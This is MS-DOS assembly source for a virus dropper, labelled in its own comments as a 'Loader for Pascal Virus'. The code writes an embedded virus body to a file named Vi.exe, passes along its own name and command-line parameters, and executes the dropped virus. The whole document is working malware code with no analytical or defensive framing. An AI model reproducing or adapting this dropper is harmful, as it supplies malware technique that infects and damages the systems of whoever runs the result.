   ; Loader for Pascal Virus

   VirLen  equ 10000       ; Virus length (not really,but no difference)

   .model tiny
   .286
   .code
       org 100h
   Loader: Call GetOfs     ; Get our offset
   GetOfs: pop  bp
       push ds cs      ; Store Ds,Ds = Cs
       pop  ds

       mov ah,3ch      ; Drop pascal virus body
       lea dx,[TstExt-GetOfs][Bp]
       xor cx,cx       ; Create file
       int 21h
       jnc Created
       jmp Quit
   Created:xchg ax,bx      ; Write body
       mov ah,40h
       lea dx,[VFile-GetOfs][Bp]
       mov cx,VirLen
       int 21h
       mov ah,3eh      ; Close File
       int 21h
       pop  ds
       mov ah,4Ah      ; Mem resize
       lea bx,[VFile+2000-GetOfs][Bp]
       shr bx,4
       inc bx
       inc bx
       int 21h
       mov ax,ds:[2Ch]     ; Get our Param Block
       push ds
       mov es,ax
       xor ax,ax
       xor di,di
       mov cx,8000h
   FindName:
   repne   scasb           ; Find our name
       scasb
       jnz FindName
       scasw
       push cs es di
       pop  si ds es
       lea di,[ComStr+2-GetOfs][Bp]    ; Copy name
   CopyStr:lodsb
       stosb
       inc byte ptr cs:[Comstr-GetOfs][Bp] ; Increase length
       cmp byte ptr cs:[ComStr-GetOfs][Bp],127 ; > 127 ?
       jae AllCopied
       cmp al,0
       jnz CopyStr
   AllCopied:
       dec di
       pop ds
       mov si,80h          ; Copy paramstring
       lodsb
       cmp al,0
       jz NoString
       xor cx,cx
       mov cl,al
   CopyParamStr:
       lodsb
       stosb
       inc byte ptr cs:[ComStr-GetOfs][Bp]
       cmp byte ptr cs:[ComStr-GetOfs][Bp],127 ; String length > 127 ?
       jae NoString
       loop CopyParamStr
   NoString:
       nop
       add cs:[P1-GetOfs][Bp],bp       ; Store different params
       mov cs:[Seg1-GetOfs][Bp],cs     ; for execution
       mov cs:[Seg2-GetOfs][Bp],ds
       mov cs:[Seg3-GetOfs][Bp],ds
       push cs
       pop  ds
       lea dx,[TstExt-GetOfs][Bp]
       lea bx,[Exec-GetOfs][Bp]
       mov ax,4B00h                ; Execute pascal virus
       int 21h
   Quit:   mov ah,4ch              ; Just exit
       int 21h

   TstExt  db  'Vi.exe',0

   Exec    dw  0
   P1  dw  offset ComStr-GetOfs
   Seg1    dw  ?
       dw  5Ch
   Seg2    dw  ?
       dw  6Ch
   Seg3    dw  ?

   Comstr  db  0
       db  20h
       db  128 dup (0)

   VFile:

   end Loader
